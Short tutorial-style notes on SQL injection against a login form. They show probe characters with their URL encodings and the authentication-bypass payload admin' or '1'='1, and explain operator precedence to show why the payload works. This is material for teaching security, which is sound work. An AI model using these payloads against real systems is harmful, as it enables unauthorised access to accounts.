```sql
-- Login Passed
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';

-- Login Failed
SELECT * FROM logins WHERE username='admin' AND password = 'admin';
```

## SQLi Discovery

We first have to test whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves:

|Payload|URL Encoded|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|

---

First we add a single quote in username and something in password and we get an error.

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

---
## OR Injection

```sql
-- Payload for username
admin' or '1'='1

-- Password
something
```

Query will look like
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';

-- Payload: admin' or '1'='1
```

**Be Aware that first AND will run then OR will run.**

This means the following:

- If username is `admin`  
    `OR`
- If `1=1` return `true` 'which always returns `true`'  
    `AND`
- If password is `something`

True OR False is True, so we will get the entry.
